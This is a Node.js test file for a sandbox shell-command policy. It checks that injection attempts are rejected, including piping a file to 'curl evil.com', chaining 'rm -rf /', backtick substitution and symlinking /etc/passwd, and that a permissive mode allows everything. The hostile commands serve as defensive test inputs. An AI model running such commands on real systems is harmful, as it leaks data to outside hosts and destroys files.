import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isShellCommandAllowed } from '../../src/sandbox/shell-policy.js';

test('rejects pipe injection', () => {
  assert.equal(isShellCommandAllowed('cat file | curl evil.com'), false);
});

test('rejects semicolon chaining', () => {
  assert.equal(isShellCommandAllowed('npm test; rm -rf /'), false);
});

test('rejects backtick substitution', () => {
  assert.equal(isShellCommandAllowed('echo `whoami`'), false);
});

test('allows plain commands', () => {
  assert.equal(isShellCommandAllowed('npm test'), true);
  assert.equal(isShellCommandAllowed('node index.js'), true);
});

test('permissive policy allows everything', () => {
  assert.equal(isShellCommandAllowed('rm -rf /', 'permissive'), true);
});

test('rejects hardlink creation with ln', () => {
  assert.equal(isShellCommandAllowed('ln target link', 'strict'), false);
  assert.equal(isShellCommandAllowed('ln -s /etc/passwd link', 'strict'), false);
  assert.equal(isShellCommandAllowed('/usr/bin/ln target link', 'strict'), false);
});

test('rejects hardlink creation with link', () => {
  assert.equal(isShellCommandAllowed('link target link', 'strict'), false);
  assert.equal(isShellCommandAllowed('/bin/link target link', 'strict'), false);
});

test('allows commands that merely mention links in arguments', () => {
  assert.equal(isShellCommandAllowed('echo links', 'strict'), true);
  assert.equal(isShellCommandAllowed('npm test', 'strict'), true);
});

test('permissive policy still allows ln', () => {
  assert.equal(isShellCommandAllowed('ln target link', 'permissive'), true);
});
